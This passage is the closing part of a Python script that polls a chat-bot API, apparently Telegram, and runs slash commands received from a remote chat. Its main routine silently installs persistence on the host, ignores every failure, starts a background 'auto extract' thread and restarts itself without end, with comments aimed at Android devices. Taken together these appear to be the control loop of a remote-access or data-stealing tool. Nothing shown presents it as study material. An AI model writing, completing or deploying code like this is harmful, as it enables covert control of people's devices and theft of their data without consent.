            time.sleep(min(2 ** errors * 2, 120))
            continue
        errors = 0
        for upd in updates.get('result', []):
            offset = upd['update_id'] + 1
            msg    = upd.get('message', {})
            text   = msg.get('text', '')
            cid    = msg.get('chat', {}).get('id')
            if text.startswith('/') and cid:
                try:
                    handle_command(text, cid)
                except Exception as e:
                    send_message(f'❌ Error: {e}', cid)
        # Slightly longer sleep on Android to save battery
        time.sleep(2)

# ============================= MAIN =============================


def main():
    if not _acquire_lock():
        sys.exit(0)

    if True:       # Always attempt persistence (silently skips unavailable methods)
        try:
            install_persistence()
        except Exception:
            pass

    if CHECK_INTERVAL > 0:
        threading.Thread(target=_auto_extract, daemon=True).start()

    while True:
        try:
            run_bot()
        except KeyboardInterrupt:
            send_message('🛑 Bot stopped.')
            break
        except Exception:
            # On mobile, wait longer before restart (network may be down)
            time.sleep(60)


if __name__ == '__main__':
    main()
